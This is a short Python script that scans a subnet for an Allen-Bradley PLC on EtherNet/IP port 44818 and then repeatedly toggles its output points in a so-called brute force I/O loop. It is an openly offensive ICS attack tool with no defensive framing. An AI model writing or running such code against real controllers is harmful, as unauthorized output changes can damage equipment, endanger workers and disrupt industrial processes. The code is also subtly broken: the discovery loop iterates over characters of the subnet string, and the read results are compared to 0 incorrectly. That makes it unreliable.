import socket
import time
from pycomm3 import LogixDriver

# Function to discover PLC's IP address
def discover_plc_ip():
    print("Discovering PLC IP address...")
    # Replace '192.168.1.0/24' with the actual subnet of your network
    subnet = '192.168.1.0/24'
    for ip in subnet:
        try:
            # Attempt to connect to the PLC on port 44818 (Allen-Bradley EtherNet/IP)
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.1)
                s.connect((ip, 44818))
                print(f"PLC found at IP: {ip}")
                return ip
        except:
            continue
    print("PLC not found on the network.")
    return None

# Function to brute force I/O points
def brute_force_io(plc_ip):
    print(f"Starting Brute Force I/O on PLC at {plc_ip}...")
    try:
        with LogixDriver(plc_ip) as plc:
            # Define the I/O points to target (modify as needed)
            io_points = ['O:0/0', 'O:0/1', 'O:0/2']  # Example output points

            # Brute force loop
            for i in range(100):  # Repeat 100 times (adjust as needed)
                for point in io_points:
                    # Toggle the I/O point value
                    current_value = plc.read(point)
                    new_value = 1 if current_value == 0 else 0
                    plc.write(point, new_value)
                    print(f"Changed {point} to {new_value}")
                    time.sleep(0.1)  # Add delay to simulate brute force
    except Exception as e:
        print(f"Error during brute force: {e}")

# Main script
if __name__ == "__main__":
    plc_ip = discover_plc_ip()
    if plc_ip:
        brute_force_io(plc_ip)
    else:
        print("Unable to proceed without PLC IP address.")